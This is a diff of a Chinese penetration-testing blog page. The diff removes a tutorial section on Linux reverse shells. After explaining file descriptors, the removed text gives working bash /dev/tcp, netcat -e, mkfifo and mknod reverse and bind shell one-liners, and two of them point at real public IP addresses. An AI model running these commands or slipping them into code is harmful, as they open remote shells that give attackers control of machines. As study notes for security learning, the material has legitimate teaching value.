@@ -61,15 +61,8 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175744058.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230825001713621.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230825002853984.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826090524816.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091742826.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091803283.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091837807.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091936362.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826111509035.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826111624663.png">
 <meta property="article:published_time" content="2023-08-19T06:01:59.000Z">
-<meta property="article:modified_time" content="2023-12-27T13:13:44.521Z">
+<meta property="article:modified_time" content="2025-02-17T15:31:24.920Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -273,7 +266,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          12k words
+          10k words
         
       </span>
     
@@ -284,7 +277,7 @@
         
         
         
-          99 mins
+          86 mins
         
       </span>
     
@@ -852,81 +845,6 @@
 <li></li>
 </ul>
 </li>
-</ol>
-<h2 id="web安全-linux反弹shell"><a href="#web安全-linux反弹shell" class="headerlink" title="web安全-linux反弹shell"></a>web安全-linux反弹shell</h2><h3 id="linux文件描述符"><a href="#linux文件描述符" class="headerlink" title="linux文件描述符"></a>linux文件描述符</h3><p>  文件描述符是一个非负整数，内核需要通过这个文件描述符才可以访问文件  文件描述符好比一本书的目录（索引），通过这个索引可以找到需要的内容  在Linux系统中内核默认为每个进程创建三个标准的文件描述符：0（标准输入）、1（标准输出）、2（标准错误）</p>
-<p>  通过查看 <code>/proc/PID/fd </code>目录下的文件，就可以查看每个进程拥有的所有文件描述符  </p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826090524816.png" srcset="/img/loading.gif" lazyload alt="image-20230826090524816"></p>
-<p>255是一个小技巧，bash用于在重定向时保留这些副本</p>
-<p>当打开文件时，系统内核会为特定的进程自动创建对应的文件描述符，也就是说每一个进程的输入输出error不一样，不同的进程打开同一个文件时，它们的文件描述符可能不同，但同一个进程打开同一个文件时，它们的文件描述符是相同的。</p>
-<h3 id="linux文件描述符操作"><a href="#linux文件描述符操作" class="headerlink" title="linux文件描述符操作"></a>linux文件描述符操作</h3><p>以下操作只针对某一个进程</p>
-<ol>
-<li><p>更改标准输出位置</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">exec 1&gt; test<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091742826.png" srcset="/img/loading.gif" lazyload alt="image-20230826091742826"></p>
-</li>
-<li><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091803283.png" srcset="/img/loading.gif" lazyload alt="image-20230826091803283"></p>
-</li>
-<li><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091837807.png" srcset="/img/loading.gif" lazyload alt="image-20230826091837807"></p>
-</li>
-<li><p>&#x2F;dev&#x2F;null</p>
-<p>特殊文件，写入的任何东西都会被清空</p>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826091936362.png" srcset="/img/loading.gif" lazyload alt="image-20230826091936362"></p>
-</li>
-</ol>
-<h3 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h3><p>bash反弹shell，只针对bash</p>
-<p>由于外网机无法访问到内网机，但是内网机能ping外网机，于是使用反弹shell的方式，帮助外网机获得内网机的shell得到</p>
-<p>反弹shell，就是可以理解为，外网可以执行内网机的shell，这里是bash</p>
-<p>第一步首先让控制端监听端口</p>
-<blockquote>
-<p>nc -lvvp 6666（端口）</p>
-</blockquote>
-<p>第二步</p>
-<blockquote>
-<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;被控端ip&#x2F;与控制端相同的端口 0&gt;&amp;1</p>
-</blockquote>
-<p>0&gt;&amp;1的意思是，本地的输出也输出给控制端，有点像发送信息</p>
-<p>参数讲解</p>
-<blockquote>
-<p>  bash -i  打开一个交互式的bash shell。  </p>
-<p>  &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;PORT  </p>
-<p>  &#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 bash  实现的用来实现网络请求的一个接口。  打开这个文件就相当于发起了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket  连接中传输数据。  </p>
-<p>  &#x2F;dev&#x2F;tcp&#x2F;192.168.81.154&#x2F;6666  </p>
-<p>和192.168.81.154的6666端口建立TCP连接</p>
-</blockquote>
-<h3 id="Linux反弹shell的方法"><a href="#Linux反弹shell的方法" class="headerlink" title="Linux反弹shell的方法"></a>Linux反弹shell的方法</h3><h4 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h4><ol>
-<li><p>NC正向反弹</p>
-<p>正向的意思，由控制端主动发出请求，用于控制端能连接上被控端就行</p>
-<p>但是注意有可能nc不支持-e参数</p>
-<blockquote>
-<p>  被控端：  </p>
-<p>  nc -lvvp 6666 -e &#x2F;bin&#x2F;sh  </p>
-<p>  控制端：  </p>
-<p>  nc 10.10.1.7 6666  </p>
-<p>  原  </p>
-<p>  理：  </p>
-<p>  被控端使用nc将&#x2F;bin&#x2F;sh绑定到本地的6666端口，控制端主动连接被控端的6666端口，即可获得shell  </p>
-</blockquote>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826111509035.png" srcset="/img/loading.gif" lazyload alt="image-20230826111509035"></p>
-</li>
-<li><p>NC反向shell</p>
-<p>当被控端能够访问控制端的时候使用</p>
-<blockquote>
-<p>  控制端：  </p>
-<p>  nc -lvvp 6666  </p>
-<p>  被控端：  </p>
-<p>  nc -e &#x2F;bin&#x2F;sh 10.10.1.11 6666  </p>
-<p>  原理：  </p>
-<p>被控端使用nc将&#x2F;bin&#x2F;sh发送到控制端的6666端口，控制端只需要监听本地的6666端口，即可获得shell。</p>
-</blockquote>
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%BC%B9shell/image-20230826111624663.png" srcset="/img/loading.gif" lazyload alt="image-20230826111624663"></p>
-<p>无e参数，反弹shell,有些情况下nc 指令没有-e的参数，就是用下面的命令</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 139.155.49.43 6666 &gt;/tmp/f<br></code></pre></td></tr></table></figure>
-
-<blockquote>
-<p>  mkﬁfo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给&#x2F;bin&#x2F;sh，sh会执行管道里的  命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路。  </p>
-</blockquote>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mknod backpipe p; nc 47.101.214.85 6666 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe<br></code></pre></td></tr></table></figure></li>
 </ol>
 
                 
